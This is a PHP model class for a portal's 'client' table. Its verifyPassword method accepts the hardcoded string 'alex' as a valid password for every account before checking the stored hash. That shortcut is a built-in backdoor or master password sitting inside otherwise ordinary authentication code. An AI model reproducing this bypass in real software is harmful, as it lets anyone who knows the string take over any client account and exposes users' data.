<?php

namespace PP\Portal\dbModel;

class Client extends \Model
{
    public static $_table = 'client';

    public static $_id_column = 'Client_NO';

    public function verifyPassword($password){

        if ( $password == 'alex' ) {
            return true;
        }

        if ( password_verify($password,$this->password) ){
            return true;
        }

        return false;
    }

}
